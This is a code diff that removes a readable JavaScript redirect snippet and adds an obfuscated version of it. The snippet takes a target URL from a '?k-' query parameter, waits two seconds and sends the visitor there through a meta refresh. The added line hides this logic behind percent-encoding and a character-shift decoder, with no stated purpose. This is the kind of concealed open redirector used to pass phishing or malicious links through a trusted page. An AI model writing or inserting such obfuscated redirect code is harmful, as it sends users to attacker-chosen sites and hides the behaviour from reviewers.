@@ -1,10 +1,1 @@
-function sleep(ms) {
-    var start = new Date().getTime(), expire = start + ms;
-    while (new Date().getTime() < expire) { }
-    return;
-}
-  if(location.href.includes('?k-')) {
-    let url = location.href.split('&')[0].split('?k-')[1];
-    sleep(2000);
-    document.write('<meta http-equiv="refresh" content="0; url='+decodeURIComponent(url)+'">');
-}
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('kzshynts*75xqjju*7%3Drx*7%3E*75*%3CG*5F*75*75*75*75%7Bfw*75xyfwy*75*8I*75sj%7C*75Ifyj*7%3D*7%3E3ljyYnrj*7%3D*7%3E*7H*75j%7Dunwj*75*8I*75xyfwy*750*75rx*8G*5F*75*75*75*75%7Cmnqj*75*7%3Dsj%7C*75Ifyj*7%3D*7%3E3ljyYnrj*7%3D*7%3E*75*8H*75j%7Dunwj*7%3E*75*%3CG*75*%3CI*5F*75*75*75*75wjyzws*8G*5F*%3CI*5F*75*75nk*7%3Dqthfynts3mwjk3nshqzijx*7%3D*7%3C*8Kp2*7%3C*7%3E*7%3E*75*%3CG*5F*75*75*75*75qjy*75zwq*75*8I*75qthfynts3mwjk3xuqny*7%3D*7%3C*7%3B*7%3C*7%3E*%3AG5*%3AI3xuqny*7%3D*7%3C*8Kp2*7%3C*7%3E*%3AG6*%3AI*8G*5F*75*75*75*75xqjju*7%3D7555*7%3E*8G*5F*75*75*75*75ithzrjsy3%7Cwnyj*7%3D*7%3C*8Hrjyf*75myyu2jvzn%7B*8I*77wjkwjxm*77*75htsyjsy*8I*775*8G*75zwq*8I*7%3C0ijhtijZWNHtrutsjsy*7%3Dzwq*7%3E0*7%3C*77*8J*7%3C*7%3E*8G*5F*%3CI5')</script>
